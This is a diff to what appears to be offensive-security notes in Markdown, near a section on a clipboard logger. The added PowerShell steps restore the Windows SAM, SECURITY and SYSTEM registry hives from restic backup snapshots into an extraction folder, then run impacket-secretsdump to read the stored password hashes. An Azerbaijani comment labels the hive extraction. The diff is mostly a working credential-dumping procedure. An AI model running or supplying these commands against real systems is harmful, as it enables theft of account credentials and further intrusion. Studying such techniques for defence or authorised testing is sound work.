@@ -41,12 +41,19 @@ Invoke-ClipboardLogger
 
 # Initialize Backup Directory
 ```powershell
-mkdir E:\restic2; restic.exe -r E:\restic2 init
-$env:RESTIC_PASSWORD = 'Password'
-restic.exe -r E:\restic2\ backup C:\SampleFolder
+mkdir E:\restic; restic.exe -r E:\restic init
+$env:RESTIC_PASSWORD = 'Superbackup!'
 
-restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
+# List Snapshots
+restic.exe -r E:\restic\ snapshots
 
-restic.exe -r E:\restic2\ snapshots
-restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
+# Check Snapshots
+restic.exe -r E:\restic\ ls b2f5caa0
+
+# Extraction Critical files
+# SAM və SECURITY fayllarının çıxarılması:
+restic.exe -r E:\restic\ restore b2f5caa0 --target C:\Extraction --include /C/Windows/System32/config/SAM --include /C/Windows/System32/config/SECURITY --include /C/Windows/System32/config/SYSTEM
+
+# Read Hashes
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
 ```
